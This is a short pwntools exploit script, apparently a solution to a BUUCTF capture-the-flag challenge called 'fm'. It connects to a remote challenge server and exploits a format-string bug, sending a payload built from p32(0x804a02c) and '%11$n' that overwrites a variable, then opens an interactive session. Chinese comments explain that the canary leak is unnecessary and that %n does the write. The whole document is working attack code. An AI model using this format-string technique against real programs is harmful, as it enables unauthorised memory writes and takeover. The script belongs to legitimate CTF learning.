from pwn import*
elf=ELF('./fm')
p=remote('node4.buuoj.cn',27482)
#p=process('./fm')
context.log_level='debug'
#无缓冲区溢出漏洞，泄漏canary也就无意义
#p.sendline(b'%31$x')      
#canary=int(p.recv(8),16)
#利用格式化字符串漏洞%n来对x地址上的值进行修改
x=0x804a02c
payload=p32(x)+b'%11$n'
p.sendline(payload)
p.interactive()